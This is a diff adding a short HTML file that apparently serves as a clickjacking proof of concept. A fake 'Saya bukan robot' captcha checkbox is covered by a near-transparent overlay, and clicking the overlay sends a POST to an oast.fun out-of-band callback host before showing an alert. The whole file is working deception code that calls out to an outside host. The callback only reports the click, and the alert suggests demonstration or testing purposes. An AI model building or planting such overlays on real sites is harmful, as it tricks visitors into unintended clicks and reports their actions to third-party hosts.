@@ -1,0 +1,25 @@
+<!-- CAPTCHA-LIKE Deception -->
+<div style="text-align:center; margin-top:120px;">
+  <label><input type="checkbox" id="captchaBox"> Saya bukan robot</label>
+</div>
+
+<script>
+  const overlay2 = document.createElement('div');
+  overlay2.style.position = 'absolute';
+  overlay2.style.top = '120px';
+  overlay2.style.left = 'calc(50% - 100px)';
+  overlay2.style.width = '200px';
+  overlay2.style.height = '40px';
+  overlay2.style.zIndex = '9999';
+  overlay2.style.cursor = 'pointer';
+  overlay2.style.background = 'rgba(0,0,0,0.01)';
+  overlay2.onclick = () => {
+    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/captcha-bypass', {
+      method: 'POST',
+      body: JSON.stringify({ click: 'captcha-deceived', ts: Date.now() }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+    alert("⚠️ You just clicked a hidden overlay!");
+  };
+  document.body.appendChild(overlay2);
+</script>
